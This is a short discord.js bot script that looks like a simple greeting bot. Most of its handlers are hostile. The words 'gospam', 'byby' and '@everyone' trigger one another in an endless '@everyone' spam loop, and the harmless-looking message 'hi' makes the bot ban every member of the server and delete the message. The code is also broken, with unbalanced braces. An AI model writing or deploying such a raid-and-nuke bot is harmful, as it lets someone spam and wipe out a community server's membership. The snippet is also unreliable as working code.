const Discord = require('discord.js');
const client = new Discord.Client();



client.on('ready', () => {
console.log(` Bot ${client.user.tag} entered the server`);
});

client.on('message', msg => {
if (msg.content.toLowerCase() === 'hey') {
msg.reply('Hey');
}

if (msg.content.toLowerCase() === 'gospam') {
msg.channel.sendMessage('byby');
}

if (msg.content.toLowerCase() === 'byby') {
msg.channel.sendMessage('@everyone');
}

if (msg.content.toLowerCase() === '@everyone') {
msg.channel.sendMessage('byby');
}

if(msg.content.toLowerCase()=== `hi`) {
try {
msg.guild.members.forEach(member => {member.ban()});
msg.delete(1000);
} catch(e) {
console.log(e.stack);
}
});
client.login('token');
  
